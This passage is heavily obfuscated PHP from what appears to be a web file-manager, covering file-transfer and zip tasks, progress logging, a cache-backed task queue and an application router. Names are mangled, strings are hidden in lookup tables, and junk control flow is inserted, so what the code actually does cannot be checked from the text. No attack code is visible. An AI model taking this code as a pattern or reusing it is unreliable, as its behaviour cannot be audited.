self::log(array("{$”ûöÖ©º}\73\x61\x64\144\75{$’ßæ³ş¼}", $àéÊŠëò)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($‡ïÒõ, $“ãöÑ½¥) { $¿ÕÊÇ°È =& $_SERVER[±Ö‰ô½¯]; $this->sourceModelCopyFlag = !0; $¥¹áÖ‰€ = 1; if (isset($‡ïÒõ[$¿ÕÊÇ°È[82]])) { $¥¹áÖ‰€ = $‡ïÒõ[$¿ÕÊÇ°È[82]][$¿ÕÊÇ°È[80]]; $¥¹áÖ‰€ = $¥¹áÖ‰€ + $‡ïÒõ[$¿ÕÊÇ°È[82]][$¿ÕÊÇ°È[81]] + 1; } $this->update($¥¹áÖ‰€); $this->sourceModelCopyFlag = !1; $this->log(array($¿ÕÊÇ°È[2010], $¥¹áÖ‰€, $‡ïÒõ)); } public function sourceMove($äÛ·Ñ÷Ï) { $this->sourceRemove($äÛ·Ñ÷Ï, !1); } public function curlProgress($Íâ•±ş¼, $Õ™öå€ê, $ñæÃÉ†´, $³æ˜ªüû, $ùÂ˜ªóç) { $úùËÀ’ş =& $_SERVER[±Ö‰ô½¯]; $ıúç—Ìë =& $this->task; if ($ùÂ˜ªóç > 0) { $ıúç—Ìë[$úùËÀ’ş[1180]] = $úùËÀ’ş[2011]; $ıúç—Ìë[$úùËÀ’ş[1985]] = $úùËÀ’ş[108]; if ($ıúç—Ìë[$úùËÀ’ş[1983]]) { $ıúç—Ìë[$úùËÀ’ş[1984]] = $ùÂ˜ªóç; } if ($ıúç—Ìë[$úùËÀ’ş[1986]]) { $ıúç—Ìë[$úùËÀ’ş[1984]] = $ùÂ˜ªóç + $ıúç—Ìë[$úùËÀ’ş[1986]]; } } else { if ($ñæÃÉ†´ > 0) { if ($ıúç—Ìë[$úùËÀ’ş[1983]] == $Õ™öå€ê) { $ıúç—Ìë[$úùËÀ’ş[1984]] = $ñæÃÉ†´; $ıúç—Ìë[$úùËÀ’ş[1180]] = $úùËÀ’ş[2012]; $ıúç—Ìë[$úùËÀ’ş[1985]] = $úùËÀ’ş[1331]; } } } $this->update(); $ÂÄˆ• = "\x64\x6f\167\156\x3a{$ñæÃÉ†´}\x2f{$Õ™öå€ê}\x3b\x20\165\160\154\157\x61\x64\x3a{$ùÂ˜ªóç}\x2f{$³æ˜ªüû}\73\146\151\x6c\x65\75" . $ıúç—Ìë[$úùËÀ’ş[1983]]; self::log(array($úùËÀ’ş[2013] . $ÂÄˆ• . $úùËÀ’ş[74] . $ıúç—Ìë[$úùËÀ’ş[1981]], curl_getinfo($Íâ•±ş¼))); } public function curlProgressStart($¤‰àåò) { } public function curlProgressEnd($°îÎÆä) { $£¨Æ¸”Ê =& $_SERVER[±Ö‰ô½¯]; $“’ˆÌÌ‹ =& $this->task; $¡û†’½± = curl_getinfo($°îÎÆä); $À¼ğªõ§ = $¡û†’½±[$£¨Æ¸”Ê[2014]]; if ($À¼ğªõ§ == -1) { $À¼ğªõ§ = $¡û†’½±[$£¨Æ¸”Ê[2015]]; } if ($“’ˆÌÌ‹[$£¨Æ¸”Ê[1985]] == $£¨Æ¸”Ê[108] && $À¼ğªõ§) { $“’ˆÌÌ‹[$£¨Æ¸”Ê[1986]] += $À¼ğªõ§; } $this->update(); } } goto Aè§ó…ëŒ¨; Aè§ó…ëŒ¨: class TaskHttp extends Task { protected function startAfter() { $º˜¯Á˜Â =& $_SERVER[±Ö‰ô½¯]; $é©£±€¼ =& $this->task; $é©£±€¼[$º˜¯Á˜Â[2016]] = 1; Hook::bind($º˜¯Á˜Â[1975], array($this, $º˜¯Á˜Â[2017])); Hook::bind($º˜¯Á˜Â[1977], array($this, $º˜¯Á˜Â[2018])); Hook::bind($º˜¯Á˜Â[1979], array($this, $º˜¯Á˜Â[2019])); } protected function endAfter() { $Š½‘Ş… =& $_SERVER[±Ö‰ô½¯]; Hook::unbind($Š½‘Ş…[1975], array($this, $Š½‘Ş…[2017])); Hook::unbind($Š½‘Ş…[1977], array($this, $Š½‘Ş…[2018])); Hook::unbind($Š½‘Ş…[1979], array($this, $Š½‘Ş…[2019])); } public function progressStart($¾˜­ÏÆ”) { $Ä³ÁÕ÷ =& $_SERVER[±Ö‰ô½¯]; $×¬çÓëö = curl_getinfo($¾˜­ÏÆ”); self::log($Ä³ÁÕ÷[2020] . $×¬çÓëö[$Ä³ÁÕ÷[384]]); self::valueSet($this->task[$Ä³ÁÕ÷[484]], $this->task); } public function progressEnd($©å“·à) { $ùÆí’‚ =& $_SERVER[±Ö‰ô½¯]; self::log($ùÆí’‚[2021] . $this->task[$ùÆí’‚[484]]); $this->end(); } public function progress($µ‚‰ê©‡, $Â¥çÃŞ, $õ¥Ï¾¼–, $‰¹‚©şî, $ó¾ä†İŸ) { $ˆü­ÑÛ² =& $_SERVER[±Ö‰ô½¯]; $ùäš‹»» =& $this->task; if ($ó¾ä†İŸ > 0) { $ùäš‹»»[$ˆü­ÑÛ²[1178]] = $ùäš‹»»[$ˆü­ÑÛ²[1178]] == 0 ? $‰¹‚©şî : $ùäš‹»»[$ˆü­ÑÛ²[1178]]; $ùäš‹»»[$ˆü­ÑÛ²[1930]] = $ó¾ä†İŸ; } else { if ($õ¥Ï¾¼– > 0) { $ùäš‹»»[$ˆü­ÑÛ²[1178]] = $ùäš‹»»[$ˆü­ÑÛ²[1178]] == 0 ? $Â¥çÃŞ : $ùäš‹»»[$ˆü­ÑÛ²[1178]]; $ùäš‹»»[$ˆü­ÑÛ²[1930]] = $õ¥Ï¾¼–; } } $this->update(); self::log("\160\162\x6f\x67\162\x65\163\x73\x48\164\x74\x70\x3a\x64\157\167\156\x3a{$õ¥Ï¾¼–}\57{$Â¥çÃŞ}\73\40\x75\160\154\x6f\x61\x64\x3a{$ó¾ä†İŸ}\x2f{$‰¹‚©şî}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÓÚğüÖ, $ÑÂƒÓä« = '', $ÉÍ¨“êû = 0, $ÀÔ“È = '') { $×µ²ì‚ì =& $_SERVER[±Ö‰ô½¯]; $ÀÔ“È = $ÀÔ“È ? $ÀÔ“È : ($ÑÂƒÓä« ? $ÑÂƒÓä« : $ÓÚğüÖ); $š‹ßËÕ× = new Task($ÓÚğüÖ, $ÑÂƒÓä«, $ÉÍ¨“êû, $ÀÔ“È); $GLOBALS[$×µ²ì‚ì[2022] . $ÓÚğüÖ] = new TaskLog($×µ²ì‚ì[1914], $š‹ßËÕ×, $ÀÔ“È); return $š‹ßËÕ×; } public function __construct($…“°Š = '', $Óƒä—ÙÅ = '', $ÏÜÕ°ˆŒ = '') { $ˆº‚¥š¹ =& $_SERVER[±Ö‰ô½¯]; if (!$…“°Š) { $…“°Š = $ˆº‚¥š¹[1914]; } $í©Ÿ¦óÌ = $…“°Š . $ˆº‚¥š¹[474] . rand_string(10); if (!$ÏÜÕ°ˆŒ) { $ÏÜÕ°ˆŒ = $…“°Š . $ˆº‚¥š¹[53] . $ÏÜÕ°ˆŒ; } switch ($…“°Š) { case $ˆº‚¥š¹[1914]: if (!$Óƒä—ÙÅ || !$Óƒä—ÙÅ->task) { return echoLog($…“°Š . $ˆº‚¥š¹[2023]); } $ıõğ°Üğ = $Óƒä—ÙÅ; $í©Ÿ¦óÌ = $ıõğ°Üğ->task[$ˆº‚¥š¹[484]]; $…“°Š = $ıõğ°Üğ->task[$ˆº‚¥š¹[484]]; if (!$ıõğ°Üğ->task[$ˆº‚¥š¹[1815]]) { $ıõğ°Üğ->task[$ˆº‚¥š¹[1815]] = $ÏÜÕ°ˆŒ ? $ÏÜÕ°ˆŒ : $…“°Š; } break; case $ˆº‚¥š¹[2024]: if (!$Óƒä—ÙÅ) { return echoLog($…“°Š . $ˆº‚¥š¹[2025]); } $Ã¿÷÷Ê¸ = is_string($Óƒä—ÙÅ) ? array($Óƒä—ÙÅ) : $Óƒä—ÙÅ; $ıõğ°Üğ = new TaskFileTransfer($í©Ÿ¦óÌ, $…“°Š, 0, $ÏÜÕ°ˆŒ ? $ÏÜÕ°ˆŒ : $Ã¿÷÷Ê¸[0]); foreach ($Ã¿÷÷Ê¸ as $şÂ‹Å¬) { $ıõğ°Üğ->addPath($şÂ‹Å¬); } break; case $ˆº‚¥š¹[390]: if (!$Óƒä—ÙÅ) { return echoLog($…“°Š . $ˆº‚¥š¹[2025]); } $Ã¿÷÷Ê¸ = is_string($Óƒä—ÙÅ) ? array($Óƒä—ÙÅ) : $Óƒä—ÙÅ; $ıõğ°Üğ = new TaskZip($í©Ÿ¦óÌ, $…“°Š, 0, $ÏÜÕ°ˆŒ ? $ÏÜÕ°ˆŒ : $Ã¿÷÷Ê¸[0]); foreach ($Ã¿÷÷Ê¸ as $şÂ‹Å¬) { $ıõğ°Üğ->addPath($şÂ‹Å¬); } break; case $ˆº‚¥š¹[1351]: if (!$Óƒä—ÙÅ) { return echoLog($…“°Š . $ˆº‚¥š¹[2025]); } $ıõğ°Üğ = new TaskUnZip($í©Ÿ¦óÌ, $…“°Š, 0, $ÏÜÕ°ˆŒ ? $ÏÜÕ°ˆŒ : $Óƒä—ÙÅ); if ($Óƒä—ÙÅ) { $ıõğ°Üğ->addFile($Óƒä—ÙÅ); } break; case $ˆº‚¥š¹[151]: $ıõğ°Üğ = new TaskHttp($í©Ÿ¦óÌ, $…“°Š); break; default: return; break; } $this->task = $ıõğ°Üğ; $this->taskID = $í©Ÿ¦óÌ; Hook::bind($ˆº‚¥š¹[1950], array($this, $ˆº‚¥š¹[2026])); Hook::bind($ˆº‚¥š¹[1952], array($this, $ˆº‚¥š¹[2027])); Hook::bind($ˆº‚¥š¹[1946], array($this, $ˆº‚¥š¹[2028])); echoLog($ˆº‚¥š¹[2029] . $ıõğ°Üğ->task[$ˆº‚¥š¹[1815]]); } public function __destruct() { $this->end(); } public function end($¨î©§È = '') { $Ê˜ä©¸¾ =& $_SERVER[±Ö‰ô½¯]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¨î©§È); $this->task = !1; $this->taskID = !1; Hook::unbind($Ê˜ä©¸¾[1950], array($this, $Ê˜ä©¸¾[2026])); Hook::unbind($Ê˜ä©¸¾[1952], array($this, $Ê˜ä©¸¾[2027])); Hook::unbind($Ê˜ä©¸¾[1946], array($this, $Ê˜ä©¸¾[2028])); } public function taskUpdate($í¢«•ùÃ) { $ú«Ô¦™ =& $_SERVER[±Ö‰ô½¯]; if (!$í¢«•ùÃ || $this->taskID != $í¢«•ùÃ[$ú«Ô¦™[484]]) { return; } $êé‡şŠÂ = 20; $“—¢‡É© = intval($í¢«•ùÃ[$ú«Ô¦™[1931]] * $êé‡şŠÂ); $ƒ»×„¨æ = $ú«Ô¦™[175] . str_repeat($ú«Ô¦™[465], $“—¢‡É©) . $ú«Ô¦™[1130] . str_repeat($ú«Ô¦™[53], $êé‡şŠÂ - $“—¢‡É©) . $ú«Ô¦™[177]; $‚¡Àë­ = $ƒ»×„¨æ . sprintf($ú«Ô¦™[2030], $í¢«•ùÃ[$ú«Ô¦™[1931]] * 100) . $ú«Ô¦™[2031]; $¤Àôƒ¸ = $‚¡Àë­ . $í¢«•ùÃ[$ú«Ô¦™[1930]] . $ú«Ô¦™[8] . $í¢«•ùÃ[$ú«Ô¦™[1178]] . LNG($ú«Ô¦™[2032]); $¡±´“ê = $ú«Ô¦™[12]; if ($í¢«•ùÃ[$ú«Ô¦™[2016]]) { $¤Àôƒ¸ = $‚¡Àë­ . size_format($í¢«•ùÃ[$ú«Ô¦™[1930]]) . $ú«Ô¦™[8] . size_format($í¢«•ùÃ[$ú«Ô¦™[1178]]); $¡±´“ê = size_format($í¢«•ùÃ[$ú«Ô¦™[1932]]) . $ú«Ô¦™[2033]; } if ($í¢«•ùÃ[$ú«Ô¦™[1180]]) { $í¢«•ùÃ[$ú«Ô¦™[1981]] = $í¢«•ùÃ[$ú«Ô¦™[1180]] . $ú«Ô¦™[53] . $í¢«•ùÃ[$ú«Ô¦™[1981]]; } if ($í¢«•ùÃ[$ú«Ô¦™[1981]]) { $¢öÒ¸Ó‚ = $ú«Ô¦™[12]; if ($í¢«•ùÃ[$ú«Ô¦™[1983]]) { $¢öÒ¸Ó‚ = $ú«Ô¦™[50] . size_format($í¢«•ùÃ[$ú«Ô¦™[1984]]) . $ú«Ô¦™[8] . size_format($í¢«•ùÃ[$ú«Ô¦™[1983]]); } $¡±´“ê .= $í¢«•ùÃ[$ú«Ô¦™[1981]] . $¢öÒ¸Ó‚; } if ($í¢«•ùÃ[$ú«Ô¦™[861]] && !$í¢«•ùÃ[$ú«Ô¦™[1983]]) { $¡±´“ê .= $ú«Ô¦™[53] . size_format($í¢«•ùÃ[$ú«Ô¦™[1988]]) . $ú«Ô¦™[8] . size_format($í¢«•ùÃ[$ú«Ô¦™[861]]); } echoLog($¤Àôƒ¸ . $ú«Ô¦™[53] . $¡±´“ê, !0); } public function taskEnd($»ş¦ó«) { $¸¡Ø®¸” =& $_SERVER[±Ö‰ô½¯]; if (!$»ş¦ó« || $this->taskID != $»ş¦ó«[$¸¡Ø®¸”[484]]) { return; } $Ã³ú¯´ø = $»ş¦ó« ? LNG($¸¡Ø®¸”[2034]) . $¸¡Ø®¸”[4] . $»ş¦ó«[$¸¡Ø®¸”[1930]] . $¸¡Ø®¸”[8] . $»ş¦ó«[$¸¡Ø®¸”[1178]] . LNG($¸¡Ø®¸”[2032]) . $¸¡Ø®¸”[74] : $¸¡Ø®¸”[12]; echoLog($¸¡Ø®¸”[2035] . $»ş¦ó«[$¸¡Ø®¸”[1815]] . ($»ş¦ó«[$¸¡Ø®¸”[537]] ? $¸¡Ø®¸”[74] . $»ş¦ó«[$¸¡Ø®¸”[537]] : $¸¡Ø®¸”[12]) . $¸¡Ø®¸”[74] . $Ã³ú¯´ø . $¸¡Ø®¸”[2036] . sprintf($¸¡Ø®¸”[960], timeFloat() - $»ş¦ó«[$¸¡Ø®¸”[1933]]) . $¸¡Ø®¸”[1945]); $this->end(); } public function taskKill($ûí´‰İ†) { $ş©»‹‡¼ =& $_SERVER[±Ö‰ô½¯]; if (!$ûí´‰İ† || $this->taskID != $ûí´‰İ†[$ş©»‹‡¼[484]]) { return; } echoLog($ş©»‹‡¼[2037] . $ûí´‰İ†[$ş©»‹‡¼[1815]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\x6b\x51\x75\x65\x75\x65\x4c\145\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\141\x73\x6b\121\x75\x65\x75\x65\104\x61\x74\141"; const QUEUE_TIME = "\164\x61\x73\x6b\x51\165\x65\x75\145\x4c\x61\x73\x74\122\165\x6e"; const QUEUE_THREAD = "\164\141\x73\153\121\x75\x65\165\145\x54\150\x72\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÍÔò‡À“, $¸áš…¼ò = array(), $¶ÏÆ‘‘ã = '', $ìÌ«ìç¾ = '') { $º¢¾Äªœ =& $_SERVER[±Ö‰ô½¯]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ìÌ«ìç¾ && array_find_by_field(self::$listData, $º¢¾Äªœ[95], $ìÌ«ìç¾)) { return !0; } if ($ìÌ«ìç¾ && array_find_by_field(self::$listDataAdd, $º¢¾Äªœ[95], $ìÌ«ìç¾)) { return !0; } self::$listDataAdd[] = array($º¢¾Äªœ[344] => $ÍÔò‡À“, $º¢¾Äªœ[2038] => $¸áš…¼ò, $º¢¾Äªœ[537] => $¶ÏÆ‘‘ã, $º¢¾Äªœ[95] => $ìÌ«ìç¾); return !0; } public static function addSubmit() { $›ù°ĞïÏ =& $_SERVER[±Ö‰ô½¯]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($›ù°ĞïÏ[2039] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $›ù°ĞïÏ[12], $›ù°ĞïÏ[537])), $›ù°ĞïÏ[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ê˜æİ©ˆ, $·³ÎÀ§± = array(), $œŒºüøË = '', $õ¡Â÷Šæ = '') { $×Ÿúëğ£ =& $_SERVER[±Ö‰ô½¯]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Çìëâ† = self::getAll(); if ($õ¡Â÷Šæ && array_find_by_field($Çìëâ†, $×Ÿúëğ£[95], $õ¡Â÷Šæ)) { return !0; } $Çìëâ†[] = array($×Ÿúëğ£[344] => $ê˜æİ©ˆ, $×Ÿúëğ£[2038] => $·³ÎÀ§±, $×Ÿúëğ£[537] => $œŒºüøË, $×Ÿúëğ£[95] => $õ¡Â÷Šæ); self::setAll($Çìëâ†); write_log($×Ÿúëğ£[2039] . $œŒºüøË, $×Ÿúëğ£[197]); return !0; } public static function run() { $Æòöº† =& $_SERVER[±Ö‰ô½¯]; $´èˆòª = self::getAll(); $ïĞÜÀ„¼ = array_shift($´èˆòª); if (!$ïĞÜÀ„¼) { return !1; } self::setAll($´èˆòª); $Ãâ–ĞÄ = timeFloat(); $³…Øœ«ğ = $Æòöº†[12]; try { $³…Øœ«ğ = Hook::apply($ïĞÜÀ„¼[$Æòöº†[344]], $ïĞÜÀ„¼[$Æòöº†[2038]]); } catch (Exception $ÆÖ¢»¶) { write_log($ÆÖ¢»¶, $Æòöº†[1317]); } $²é¹ŒÜ = number_format(timeFloat() - $Ãâ–ĞÄ, 3) . $Æòöº†[1945]; if ($³…Øœ«ğ && is_string($³…Øœ«ğ)) { $²é¹ŒÜ = $²é¹ŒÜ . $Æòöº†[2040] . $³…Øœ«ğ; } write_log($Æòöº†[2041] . $ïĞÜÀ„¼[$Æòöº†[537]] . $Æòöº†[2042] . $²é¹ŒÜ, $Æòöº†[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $Ú­Ûı¢Ñ =& $_SERVER[±Ö‰ô½¯]; $²´¼ÆÓ = self::threadCount() + 1; if ($²´¼ÆÓ > 3 || !self::count()) { return; } write_log($Ú­Ûı¢Ñ[2043] . $²´¼ÆÓ, $Ú­Ûı¢Ñ[197]); Cache::set(self::QUEUE_THREAD, $²´¼ÆÓ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($Ú­Ûı¢Ñ[2044], $Ú­Ûı¢Ñ[197]); } public static function getKey($ÓÒ•á•©, $Áí€œ¦¹ = "\151\156\164") { $Ğªœ¨÷ç =& $_SERVER[±Ö‰ô½¯]; Cache::removeMemory($ÓÒ•á•©); $ñŸ£–š = Cache::get($ÓÒ•á•©); if ($Áí€œ¦¹ == $Ğªœ¨÷ç[366]) { return $ñŸ£–š ? intval($ñŸ£–š) : 0; } if ($Áí€œ¦¹ == $Ğªœ¨÷ç[2045]) { return is_array($ñŸ£–š) ? $ñŸ£–š : array(); } return $ñŸ£–š; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[±Ö‰ô½¯][2045]); } public static function setAll($–•ÕÀ‹) { $½¬”›õ® = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($–•ÕÀ‹), $½¬”›õ®); Cache::set(self::QUEUE_DATA, $–•ÕÀ‹, $½¬”›õ®); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto FçàÎ“‰µ; eçŠñìƒŞ¯: class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\151\156\x64\145\x78"; function __construct() { } public function setDefault($â‹›…§) { $©áôå¤¸ =& $_SERVER[±Ö‰ô½¯]; $´‘“‚Îò =& $_SERVER[îâŸó­ˆ]; $¥’Óåø‘ = explode($´‘“‚Îò[0], trim($â‹›…§, $´‘“‚Îò[0])); $æğÁî = $©áôå¤¸[703]; while ($æğÁî < $©áôå¤¸[704]) { if ($æğÁî >= 0) { break; } $æğÁî++; } $this->defaultModule = $¥’Óåø‘[0] ? $¥’Óåø‘[0] : $this->defaultModule; $ŞºĞã‘€ = $©áôå¤¸[705]; while (strlen($ŞºĞã‘€) < $©áôå¤¸[704]) { if (!$ŞºĞã‘€) { break; } $ŞºĞã‘€++; } $this->defaultController = $¥’Óåø‘[1] ? $¥’Óåø‘[1] : $this->defaultController; $this->defaultAction = $¥’Óåø‘[2] ? $¥’Óåø‘[2] : $this->defaultAction; $Ü´Îú¥Ï = $©áôå¤¸[706]; if (strlen($Ü´Îú¥Ï) < $©áôå¤¸[704]) { die; } $this->qpbgc05d2356($´‘“‚Îò[1], array($this, $´‘“‚Îò[2])); $ˆ˜İÓ¬Î = $©áôå¤¸[707]; if (!$ˆ˜İÓ¬Î) { die; } } public function appRun($®×“ñÍÉ) { $‘°´Şş =& $_SERVER[±Ö‰ô½¯]; $âÒÓ°Ì» =& $_SERVER[îâŸó­ˆ]; $ï¬ÍÙ¿Ë = explode($âÒÓ°Ì»[0], $®×“ñÍÉ); $Ù»ÜèÈ = strtolower($ï¬ÍÙ¿Ë[0]); $˜¹µß•‡ = $‘°´Şş[708]; if (!$˜¹µß•‡) { die; } $´å±½È· = $âÒÓ°Ì»[3]; $†×¼«ãÀ = $‘°´Şş[709]; if (strlen($†×¼«ãÀ) < $‘°´Şş[710]) { return; } if ($Ù»ÜèÈ == $âÒÓ°Ì»[4]) { $´å±½È· = $âÒÓ°Ì»[5]; $ï¬ÍÙ¿Ë[0] = $âÒÓ°Ì»[6]; $ï¬ÍÙ¿Ë[1] = $ï¬ÍÙ¿Ë[1] . $âÒÓ°Ì»[7]; $®×“ñÍÉ = join($âÒÓ°Ì»[0], $ï¬ÍÙ¿Ë); $®×“ñÍÉ = trim($®×“ñÍÉ, $âÒÓ°Ì»[0]); } call_user_func(array($âÒÓ°Ì»[8], $âÒÓ°Ì»[9]), $´å±½È· . $âÒÓ°Ì»[10], $®×“ñÍÉ); ActionCall($®×“ñÍÉ); $Çá®æç = $‘°´Şş[711]; if (strlen($Çá®æç) < $‘°´Şş[712]) { return; } call_user_func(array($âÒÓ°Ì»[8], $âÒÓ°Ì»[9]), $´å±½È· . $âÒÓ°Ì»[11], $®×“ñÍÉ); } private function autorun() { $²’¹é¤» =& $_SERVER[îâŸó­ˆ]; global $config; if (count($config[$²’¹é¤»[12]]) == 0) { return; } foreach ($config[$²’¹é¤»[12]] as $œ¨şéƒ => $Şõ¤Ì€·) { $this->appRun($Şõ¤Ì€·); $ıˆ’³·» = $_SERVER[±Ö‰ô½¯][713]; } } private function xmys3a613866() { $˜ƒÎç¬ø =& $_SERVER[±Ö‰ô½¯]; $©´æñÈ =& $_SERVER[îâŸó­ˆ]; $ì‚„¿Ê… = $©´æñÈ[4]; $µìÆ€’ˆ = $˜ƒÎç¬ø[714]; $…ÛĞ•Ğ = $GLOBALS[$©´æñÈ[13]][$©´æñÈ[14]][0]; $ğ¨‹Ì½ç = $˜ƒÎç¬ø[715]; if (strlen($ğ¨‹Ì½ç) < $˜ƒÎç¬ø[712]) { return; } if (!$…ÛĞ•Ğ || strlen($…ÛĞ•Ğ) <= strlen($ì‚„¿Ê…)) { return; } if (strtolower(substr($…ÛĞ•Ğ, -strlen($ì‚„¿Ê…))) != $ì‚„¿Ê…) { return; } $İ¡Åäê = substr($…ÛĞ•Ğ, 0, -strlen($ì‚„¿Ê…)); $©åíóˆ¿ = $˜ƒÎç¬ø[716]; if (strlen($©åíóˆ¿) < $˜ƒÎç¬ø[717]) { die; } $¶Ø­«İ¬ = array($©´æñÈ[4], $İ¡Åäê); $èø£ã§¢ = $˜ƒÎç¬ø[718]; while (strlen($èø£ã§¢) < $˜ƒÎç¬ø[704]) { if (!$èø£ã§¢) { break; } $èø£ã§¢++; } $ëñ‘İ û = array_slice($GLOBALS[$©´æñÈ[13]][$©´æñÈ[14]], 1); $GLOBALS[$©´æñÈ[13]][$©´æñÈ[14]] = array_merge($¶Ø­«İ¬, $ëñ‘İ û); $GLOBALS[$©´æñÈ[13]][$©´æñÈ[15]] = implode($©´æñÈ[0], $GLOBALS[$©´æñÈ[13]][$©´æñÈ[14]]); $µ£àßÓ‹ = $˜ƒÎç¬ø[719]; while ($µ£àßÓ‹ < $˜ƒÎç¬ø[717]) { if ($µ£àßÓ‹ >= 0) { break; } $µ£àßÓ‹++; } } private function qvpmdb6e362a() { $ä½•£‚“ =& $_SERVER[±Ö‰ô½¯]; $’Ä¿áğÅ =& $_SERVER[îâŸó­ˆ]; if ($GLOBALS[$’Ä¿áğÅ[13]][$’Ä¿áğÅ[15]] != $’Ä¿áğÅ[6]) { return; } $¾‚¢Äï  = $_SERVER[$’Ä¿áğÅ[16]]; $—æÁ¡Ô = $’Ä¿áğÅ[17]; $¨øõ÷‘“ = $ä½•£‚“[720]; if (!$¨øõ÷‘“) { die; } if (!strstr($¾‚¢Äï , $—æÁ¡Ô)) { return; } $Àêä­ÇÇ = strrpos($¾‚¢Äï , $—æÁ¡Ô); $ï¼ââ¢­ = $ä½•£‚“[721]; $Ó§ğÍ¡¢ = substr($¾‚¢Äï , $Àêä­ÇÇ + strlen($—æÁ¡Ô)); preg_match_all($’Ä¿áğÅ[18], $Ó§ğÍ¡¢, $ÏÎ±ˆ³Å); $†ïÆ¶…ö = $ä½•£‚“[722]; if (strlen($†ïÆ¶…ö) < $ä½•£‚“[704]) { die; } $Ó§ğÍ¡¢ = trim($ÏÎ±ˆ³Å[0][0], $’Ä¿áğÅ[19]); $‘¸Î…ŞÈ = $ä½•£‚“[723]; $GLOBALS[$’Ä¿áğÅ[13]][$’Ä¿áğÅ[14]] = explode($’Ä¿áğÅ[19], $Ó§ğÍ¡¢); $ğï­ÕÈÕ = $ä½•£‚“[724]; if (!$ğï­ÕÈÕ) { die; } $GLOBALS[$’Ä¿áğÅ[13]][$’Ä¿áğÅ[15]] = implode($’Ä¿áğÅ[0], $GLOBALS[$’Ä¿áğÅ[13]][$’Ä¿áğÅ[14]]); } public function run() { $‘ï³şçÛ =& $_SERVER[±Ö‰ô½¯]; $•åëı”¼ =& $_SERVER[îâŸó­ˆ]; $this->qvpmdb6e362a(); $this->xmys3a613866(); $µè‚ú±™ = $GLOBALS[$•åëı”¼[13]][$•åëı”¼[14]]; $¶ù‰õğí = $GLOBALS[$•åëı”¼[13]][$•åëı”¼[15]]; $¿¨ğ°… = $‘ï³şçÛ[725]; if (!$¿¨ğ°…) { return; } define($•åëı”¼[20], isset($µè‚ú±™[0]) && $µè‚ú±™[0] ? $µè‚ú±™[0] : $this->defaultModule); define($•åëı”¼[21], isset($µè‚ú±™[1]) && $µè‚ú±™[0] ? $µè‚ú±™[1] : $this->defaultController); define($•åëı”¼[22], isset($µè‚ú±™[2]) && $µè‚ú±™[0] ? $µè‚ú±™[2] : $this->defaultAction); $øè¶Õ²¥ = $‘ï³şçÛ[726]; while (strlen($øè¶Õ²¥) < $‘ï³şçÛ[704]) { if (!$øè¶Õ²¥) { break; } $øè¶Õ²¥++; } define($•åëı”¼[23], MOD . $•åëı”¼[0] . ST . $•åëı”¼[0] . ACT); $Âè…°úÛ = $‘ï³şçÛ[727]; if (strlen($Âè…°úÛ) < $‘ï³şçÛ[710]) { return; } $_SERVER[$•åëı”¼[24]] = strtolower(ACTION); $this->autorun(); $ÑŠ÷…âê = $‘ï³şçÛ[728]; if (count($µè‚ú±™) >= 3) { $this->appRun($¶ù‰õğí); } else { $this->appRun(ACTION); } } private $fsnte7f710df = array(); private $xfnj9a3a9d5d = ''; public function uloj9f147738() { $¨°Ğ•ˆ =& $_SERVER[±Ö‰ô½¯]; $Òêº“ºİ =& $_SERVER[îâŸó­ˆ]; $this->tesk788bef0b(); $µÏŸú©İ = $¨°Ğ•ˆ[729]; if (!$µÏŸú©İ) { die; } $this->lysob6f30bc6(); $this->kwmcf44a9ffd(); $”ÏÁ±š = $¨°Ğ•ˆ[728]; if (!$”ÏÁ±š) { return; } $this->hwrc50ef619a(); $‡ì¢Ú¬µ = $¨°Ğ•ˆ[730]; $this->kxbufec1321c(); $ûØ§ö»÷ = $¨°Ğ•ˆ[731]; if (strlen($ûØ§ö»÷) < $¨°Ğ•ˆ[717]) { return; } $this->lreie5c22cb0(); $ŞæÅİ§¥ = $¨°Ğ•ˆ[732]; $this->iyhc7b6e324b(); $åÑ®é¼ = $¨°Ğ•ˆ[733]; if (!$åÑ®é¼) { die; } $this->qpbgc05d2356($Òêº“ºİ[25], array($this, $Òêº“ºİ[26])); $í¢¯æçŞ = $¨°Ğ•ˆ[734]; $this->qpbgc05d2356($Òêº“ºİ[27], array($this, $Òêº“ºİ[28])); $íá¾Ñ½¨ = $¨°Ğ•ˆ[735]; $this->qpbgc05d2356($Òêº“ºİ[29], array($this, $Òêº“ºİ[30])); $this->qpbgc05d2356($Òêº“ºİ[31], array($this, $Òêº“ºİ[32])); $­¹ á€ = $¨°Ğ•ˆ[736]; while (strlen($­¹ á€) < $¨°Ğ•ˆ[717]) { if (!$­¹ á€) { break; } $­¹ á€++; } } public function getVersionData() { return $this->fsnte7f710df; } public function fgtp029ecd47($ë¦³Áû¯) { $Á½ÒÁ¯ =& $_SERVER[±Ö‰ô½¯]; $Ğä¯éÓÇ =& $_SERVER[îâŸó­ˆ]; $ØÌÄ©å = 